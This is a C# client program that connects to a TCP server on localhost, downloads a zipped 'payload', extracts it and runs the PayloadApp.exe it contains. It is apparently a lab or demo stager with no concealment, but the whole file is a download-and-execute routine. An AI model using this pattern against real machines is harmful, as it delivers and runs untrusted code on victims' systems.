using System;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Diagnostics;

class ClientProgram
{
    static void Main()
    {
        string serverIP = "127.0.0.1";
        int serverPort = 12345;
        string zipFile = "PayloadApp.zip";
        string extractDir = "unzipped";

        TcpClient client = null;
        NetworkStream stream = null;
        BinaryReader reader = null;

        try
        {
            Console.WriteLine("[*] Connecting to server...");
            client = new TcpClient(serverIP, serverPort);
            stream = client.GetStream();
            reader = new BinaryReader(stream);

            int payloadSize = reader.ReadInt32();
            Console.WriteLine($"[+] Payload size: {payloadSize} bytes");

            if (payloadSize <= 0)
            {
                Console.WriteLine("❌ Payload is invalid or server does not send.");
                return;
            }

            byte[] buffer = new byte[payloadSize];
            int totalRead = 0;
            while (totalRead < payloadSize)
            {
                int bytesRead = stream.Read(buffer, totalRead, payloadSize - totalRead);
                if (bytesRead == 0) break;
                totalRead += bytesRead;
            }

            File.WriteAllBytes(zipFile, buffer);
            Console.WriteLine($"[+] Payload saved: {zipFile}");

            if (Directory.Exists(extractDir))
                Directory.Delete(extractDir, true);
            ZipFile.ExtractToDirectory(zipFile, extractDir);
            Console.WriteLine("[+] Payload extracted.");

            string exePath = Path.Combine(extractDir, "PayloadApp.exe");
            if (!File.Exists(exePath))
            {
                Console.WriteLine("❌ Can't find PayloadApp.exe after extracted.");
                return;
            }

            Console.WriteLine("[*] Running PayloadApp.exe...");
            Process.Start(new ProcessStartInfo
            {
                FileName = exePath,
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Normal
            });

            // GIỮ KẾT NỐI CHO ĐẾN KHI USER TẮT
            Console.WriteLine("[i] Press ENTER to exit and disconnect...");
            Console.ReadLine();

            // Gửi tín hiệu cho server biết client muốn ngắt
            StreamWriter writer = new StreamWriter(stream) { AutoFlush = true };
            writer.WriteLine("done");  // gửi kết thúc
        }
        catch (Exception ex)
        {
            Console.WriteLine("❌ Error: " + ex.Message);
        }
        finally
        {
            reader?.Close();
            stream?.Close();
            client?.Close();
        }
    }
}
